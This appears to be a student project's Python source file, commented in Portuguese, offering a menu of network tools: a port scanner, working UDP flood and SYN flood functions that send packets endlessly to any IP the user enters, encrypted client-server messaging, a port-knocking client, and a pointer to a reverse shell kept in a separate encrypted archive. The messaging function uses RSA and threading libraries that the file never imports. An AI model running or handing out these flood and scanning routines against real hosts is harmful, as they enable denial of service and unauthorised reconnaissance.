# Para executar o código abaixo em uma máquina Kali Linux, é necessário em grande parte das vezes instalar as Bibliotecas utilizando os seguintes comandos:
# pip install scapy
# pip install pycryptodome
# pip install cryptography
 

import os  # Gerar um valor salt aleatório em criptografia
import socket  # Usado em todas as funções de rede para criar conexões TCP/UDP
import ipaddress  # Gerar e manipular faixas de endereços IP na varredura de portas
import random  # Gerar números aleatórios, como portas em flood_udp e bytes aleatórios
import time  # Introduzir atrasos, por exemplo, no port knocking
from scapy.all import *  # Usado na função syn_flood para criação e envio de pacotes de rede personalizados
from Crypto.Cipher import AES  # Encriptação e decriptação AES nas funções de troca de mensagens
from Crypto.Util.Padding import pad, unpad  # Adicionar e remover padding em blocos AES
from cryptography.hazmat.backends import default_backend  # Backend para a geração de chaves criptográficas
from cryptography.hazmat.primitives import hashes  # Especificar o algoritmo de hash na geração de chaves
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC  # Derivar uma chave a partir de uma senha e salt


# Parte das funções abaixo foram adaptadas dos exemplos demonstrados em aula no IPBeja pelo Professor Armando Ventura no módulo de Linguagens de Programação Dinâmicas. 

def varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final):
    # Cria uma faixa de IPs a partir do argumento fornecido
    faixa_ip = ipaddress.IPv4Network(faixa_ips_alvo, strict=False)

    for ip_alvo in faixa_ip: # Itera sobre cada IP na faixa
        portas_abertas = [] # Lista para armazenar portas abertas
        portas_fechadas = 0 # Contador de portas fechadas

        for porta in range(porta_inicial, porta_final + 1): # Itera sobre o intervalo de portas
            soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soquete.settimeout(1) # Define um timeout para a conexão

            resultado = soquete.connect_ex((str(ip_alvo), porta))
            soquete.close()

            if resultado == 0: # Se a conexão for bem-sucedida, a porta está aberta
                portas_abertas.append(str(porta))
            else: # Se não, incrementa o contador de portas fechadas
                portas_fechadas += 1

        # Exibe os resultados para o IP atual
        print(f"\nResultados para o IP {ip_alvo}:")
        print("Portas abertas: " + ", ".join(portas_abertas))
        print(f"Número de Portas Fechadas: {portas_fechadas}")


def flood_udp(ip_alvo):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024) # Gera um payload aleatório

    sent = 0
    while True: # Envia pacotes indefinidamente
        sock.sendto(bytes_to_send, (ip_alvo, random.randint(1, 65535)))
        sent += 1
        print(f"Sent {sent} amount of packets to {ip_alvo}")
        ### Caso queira limitar o número de Pacotes --->
        # if sent >= 100000:
            # break
        ### Caso queira limitar o número de Pacotes <---


# Baseado no artigo "How to Make a SYN Flooding Attack in Python" / "Abdeladim Fadheli" - https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python --->
def syn_flood(ip_alvo, porta_alvo):
    ip = IP(dst=ip_alvo)
    tcp = TCP(sport=RandShort(), dport=porta_alvo, flags="S")
    raw = Raw(b"X"*1024)
    packet = ip / tcp / raw
    send(packet, loop=1, verbose=0)
# Baseado no artigo "How to Make a SYN Flooding Attack in Python" / "Abdeladim Fadheli" - https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python <---
 

# Conjunto de Funções para a Troca de Mensagens Servidor/Cliente --->
def generate_key_from_password(password, salt):
    # Gera uma chave a partir de uma senha usando PBKDF2
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def encrypt_message(key, message, salt):
    # Encripta uma mensagem usando AES
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(message, AES.block_size))
    return salt + cipher.iv + ct_bytes  

def decrypt_message(password, encrypted_message):
    # Desencripta uma mensagem usando AES
    salt = encrypted_message[:16]
    iv = encrypted_message[16:32]
    ct = encrypted_message[32:]
    key = generate_key_from_password(password, salt)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

def server_side(port, password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('127.0.0.1', port)) # Configura o servidor para escutar em localhost na porta especificada
        s.listen()
        conn, addr = s.accept() # Aceita uma conexão
        conn.send("Conectado".encode())
        dataFromClient = conn.recv(4096)
        decrypted_data = decrypt_message(password, dataFromClient) # Desencripta os dados recebidos
        print(decrypted_data.decode())
        conn.close()
    except Exception as e:
        print(f"An error occurred: {e}")

def client_side(ip, port, password):
    try:
        salt = os.urandom(16) # Gera um salt aleatório
        key = generate_key_from_password(password, salt)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port)) # Conecta ao servidor
        dataFromServer = s.recv(1024)
        print(dataFromServer.decode())
        dataToServer = "Conectando"
        encrypted_data = encrypt_message(key, dataToServer.encode(), salt) # Encripta os dados a serem enviados
        s.send(encrypted_data)
        s.close()
    except Exception as e:
        print(f"An error occurred: {e}")

# Conjunto de Funções para a Troca de Mensagens Servidor/Cliente <---


def port_knocking():
    target_ip = input("Digite o endereço IP do servidor alvo: ")
    knocking_ports = [int(port) for port in input("Digite as portas para o port knocking (separadas por espaço): ").split()] # Lista de portas para o port knocking
    for port in knocking_ports:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(b'', (target_ip, port)) # Envia um pacote vazio para cada porta
            time.sleep(1) # Espera 1 segundo entre cada envio


def troca_de_mensagens():
    public_key, private_key = rsa.newkeys(1024)
    public_partner = None

    choice = input("Digite 1 para Servidor e 2 para Cliente: ")

    if choice == "1":
        ip = input("Digite o IP para o servidor ou deixe em branco para usar 'localhost': ") or "localhost"
        porta = input("Digite a porta para o servidor: ")
        try:
            porta = int(porta)
        except ValueError:
            print("Porta inválida. Por favor, insira um número.")
            exit()

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((ip, porta))
        server.listen()

        print(f"Servidor iniciado em {ip}:{porta}. Aguardando conexões...")
        client, _ = server.accept()
        client.send(public_key.save_pkcs1("PEM"))
        public_partner = rsa.PublicKey.load_pkcs1(client.recv(1024))

    elif choice == "2":
        ip = input("Digite o IP para se conectar: ")
        porta = input("Digite a porta para se conectar: ")
        try:
            porta = int(porta)
        except ValueError:
            print("Porta inválida. Por favor, insira um número.")
            exit()

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((ip, porta))
        except Exception as e:
            print(f"Não foi possível conectar ao servidor {ip}:{porta}. Erro: {e}")
            exit()

        public_partner = rsa.PublicKey.load_pkcs1(client.recv(1024))
        client.send(public_key.save_pkcs1("PEM"))

    else:
        print("Opção inválida.")
        exit()

    def sending_messages(c):
        while True:
            message = input("")
            c.send(rsa.encrypt(message.encode(), public_partner))
            print("Você: " + message)
            
    def receiving_messages(c):
        while True:
            try:
                print("Parceiro: " + rsa.decrypt(c.recv(1024), private_key).decode())
            except Exception as e:
                print("Erro ao receber a mensagem: ", e)
                break

    threading.Thread(target=sending_messages, args=(client,)).start()
    threading.Thread(target=receiving_messages, args=(client,)).start()





def Menu_do_Programa():
    os.system('clear')
    print("\nLPD-Project | Linguagens de Programação Dinâmicas\n")
    print("1- Port Scan")
    print("2- UDP Flood")
    print("3- SYN Flood")
    print("4- Troca de Mensagens (Versão Alternativa Externa)")
    print("5- Troca de Mensagens")
    print("6- Client Port Knocking")
    print("7- (Adicional) Reverse Shell")
    print("\n0- Sair\n")


def main():
    while True:
        Menu_do_Programa()
        escolha = input("Escolha uma opção: ")
        os.system('clear')

        if escolha == "1":
            print("1- Port Scan\n")
            faixa_ips_alvo = input("Digite o IP(s) alvo (Ex. 192.168.0.1-25): ")
            porta_inicial, porta_final = map(int, input("Digite o intervalo de portas (Ex 1-1000): ").split('-'))
            varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final)
            input("Pressione Enter para continuar...")

        elif escolha == "2":
            print("2- UDP Flood\n")
            ip_alvo = input("Digite o IP alvo: ")
            flood_udp(ip_alvo)

        elif escolha == "3":
            print("3- SYN Flood\n")
            ip_alvo = input("Digite o IP alvo: ")
            porta_alvo = int(input("Digite a porta alvo: "))
            syn_flood(ip_alvo, porta_alvo)
            input("Pressione Enter para continuar...")

        elif escolha == "4":
            print("4- Troca de Mensagens (Versão Alternativa Externa)\n")
            print("Para utilizar essa função, por gentileza execute o script 'TrocaMensagensAlternativo.py' que está na pasta 'src' deste projeto\n")
            input("Pressione Enter para continuar...")

        elif escolha == "5":
            print("5- Troca de Mensagens\n")
            escolha_server_client = input("Digite 1 para servidor ou 2 para cliente: ")
            if escolha_server_client == '1':
                port = int(input("Digite a porta do servidor: "))
                password = input("Digite a senha para criptografia: ")
                server_side(port, password)
            elif escolha_server_client == '2':
                ip = input("Digite o IP do servidor: ")
                port = int(input("Digite a porta do servidor: "))
                password = input("Digite a senha para criptografia: ")
                client_side(ip, port, password)
            else:
                print("Opção inválida.")
                input("Pressione Enter para continuar...")

        elif escolha == "6":
            print("6- Client Port Knocking\n")
            print("Para configurar um servidor, primeiro utilize seguinte script: \n\n* filter\n:INPUT DROP [0:0]\n:FORWARD DROP [0:0]\n:OUTPUT ACCEPT [0:0]\n:TRAFFIC - [0:0]\n:SSH-INPUT - [0:0]\n:SSH-INPUTTWO - [0:0]\n# TRAFFIC chain for Port Knocking. The correct port sequence in this example is 8881 -> 7777 -> 9991; any other sequence will drop the traffic\n-A INPUT -j TRAFFIC\n-A TRAFFIC -p icmp --icmp-type any -j ACCEPT\n-A TRAFFIC -m state --state ESTABLISHED, RELATED -j ACCEPT\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 22 -m recent --rcheck --seconds 30 --name SSH2 -j ACCEPT\n-A TRAFFIC -m state --state NEW -m tcp -p tcp -m recent --name SSH2 --remove -j DROP\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 9991 -m recent --rcheck --name SSH1 -j SSH-INPUTTWO\n-A TRAFFIC -m state --state NEW -m tcp -p tcp -m recent --name SSH1 --remove -j DROP\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 7777 -m recent --rcheck --name SSHO -j SSH-INPUT\n-A TRAFFIC -m state --state NEW -m tcp -p tcp -m recent --name SSHO --remove -j DROP\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 8881 -m recent --name SSHO --set -j DROP\n-A SSH-INPUT -m recent --name SSH1 --set -j DROP\n-A SSH-INPUTTWO -m recent --name SSH2 --set -j DROP\n-A TRAFFIC -j DROP\nCOMMIT\n# END or further rules")
            input("Pressione Enter para continuar...")
            os.system('clear')
            port_knocking()
            input("Pressione Enter para continuar...")
            os.system('clear')

        elif escolha == "7":
            print("(Adicional) Reverse Shell\n")
            print("As instruções e arquivos deste módulo `Reverse Shell`, estão disponíveeis dentro do arquivo `Payload.7z`.\nA chave para descompactar e descriptografar esse arquivo está incluída no relatório desse programa.\n")
            input("Pressione Enter para continuar...")

        elif escolha == "0":
            print("Saindo do programa...")
            break

        else:
            print("Opção Inválida")
            input("Pressione Enter para continuar...")


if __name__ == "__main__":
    main()
